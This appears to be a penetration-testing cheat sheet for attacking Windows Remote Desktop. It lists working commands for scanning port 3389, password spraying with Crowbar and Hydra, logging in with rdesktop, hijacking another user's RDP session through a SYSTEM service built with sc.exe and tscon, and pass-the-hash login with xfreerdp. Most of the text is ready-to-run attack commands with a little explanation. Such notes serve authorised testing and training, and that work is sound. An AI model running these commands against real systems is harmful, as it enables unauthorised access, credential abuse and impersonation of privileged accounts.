
# Nmap

```
nmap -Pn -p3389 192.168.2.143 
```

# Password Attacks

```
cat usernames.txt 

root
test
user
guest
admin
administrator
```

## Crowbar

```
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

## Hydra

```
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

## RDesktop

```
rdesktop -u admin -p password123 192.168.2.143
```

# RDP Session Hijacking

If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.

To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. It works by specifying which SESSION ID (4 for the lewen session in our example) we would like to connect to which session name (rdp-tcp#13, which is our current session). So, for example, the following command will open a new console as the specified SESSION_ID within our current RDP session:

```
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges. We will use [Microsoft sc.exe binary](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create). First, we specify the service name (sessionhijack) and the binpath, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.

```
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

```
net start sessionhijack
```

> Note: This method no longer works on Server 2019.

## XFreeRDP PassTheHash

```
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

